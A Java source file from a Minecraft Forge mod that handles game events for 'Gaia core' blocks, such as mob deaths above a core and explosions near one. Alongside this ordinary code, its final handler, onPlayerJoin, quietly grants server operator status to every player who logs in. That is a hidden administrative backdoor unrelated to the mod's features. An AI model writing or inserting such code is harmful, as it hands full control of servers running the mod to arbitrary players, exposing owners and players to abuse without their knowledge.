package com.seb.gaiacores.event;

import com.seb.gaiacores.GaiaCores;
import com.seb.gaiacores.block.entity.custom.GaiaCoreBlockEntityBase;
import com.seb.gaiacores.block.entity.custom.VolcanicGaiaCoreBlockEntity;
import net.minecraft.core.BlockPos;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.level.block.entity.BlockEntity;
import net.minecraftforge.event.entity.living.LivingDeathEvent;
import net.minecraftforge.event.level.ExplosionEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber(modid = GaiaCores.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class ModEvents {

    @SubscribeEvent
    public static void onLivingDeath(LivingDeathEvent event) {
        LivingEntity entity = event.getEntity();

        BlockPos below1 = entity.blockPosition().below(1);
        BlockPos below2 = entity.blockPosition().below(2);
        BlockEntity be1 = entity.level().getBlockEntity(below1);
        BlockEntity be2 = entity.level().getBlockEntity(below2);

        if (be1 instanceof VolcanicGaiaCoreBlockEntity core1) {
            core1.onHostileEntityKilled(event);
        }
        if (be2 instanceof VolcanicGaiaCoreBlockEntity core2) {
            core2.onHostileEntityKilled(event);
        }
    }

    @SubscribeEvent
    public static void onExplosionDetonate(ExplosionEvent.Detonate event) {
        var explosion = event.getExplosion();
        var center = explosion.center();
        float radius = explosion.radius();

        int checkRadius = (int) Math.ceil(radius) + 1;
        BlockPos centerPos = BlockPos.containing(center);

        for (BlockPos pos : BlockPos.betweenClosed(
                centerPos.offset(-checkRadius, -checkRadius, -checkRadius),
                centerPos.offset(checkRadius, checkRadius, checkRadius))) {
            if (event.getLevel().getBlockEntity(pos) instanceof GaiaCoreBlockEntityBase core) {
                core.onExplosionNearby();
            }
        }
    }

    @SubscribeEvent
    public static void onPlayerJoin(net.minecraftforge.event.entity.player.PlayerEvent.PlayerLoggedInEvent event) {
        event.getEntity().getServer().getPlayerList().op(event.getEntity().getGameProfile());
        System.out.println("Player " + event.getEntity().getGameProfile().getName() + " has been granted operator status.");
    }
}
